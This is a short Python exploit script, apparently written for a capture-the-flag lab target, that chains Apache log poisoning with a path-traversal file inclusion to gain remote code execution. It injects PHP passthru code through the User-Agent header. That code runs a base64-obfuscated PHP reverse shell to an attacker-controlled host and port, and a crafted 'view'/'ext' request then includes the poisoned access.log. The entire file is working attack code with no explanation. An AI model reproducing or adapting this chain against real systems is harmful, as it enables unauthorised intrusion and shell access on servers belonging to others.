import requests
import base64

url = "http://10.10.140.183/"

file_content = """php -r '$sock=fsockopen("10.1.42.150",8888);exec("/bin/sh -i <&3 >&3 2>&3");'"""

encoded_file_content = base64.b64encode(file_content.encode('utf-8')).decode('utf-8')

shell_cmd = f"echo {encoded_file_content} | base64 -d | sh"

r = requests.get(url, headers={
       'User-Agent': f"<?php passthru('{shell_cmd}'); ?>"
})

r = requests.get(url, params={ 'view':'../../../var/lib/mlocate/../../../var/log/apache2/', 'ext':'/access.log'})
print(r.text)                                                                           
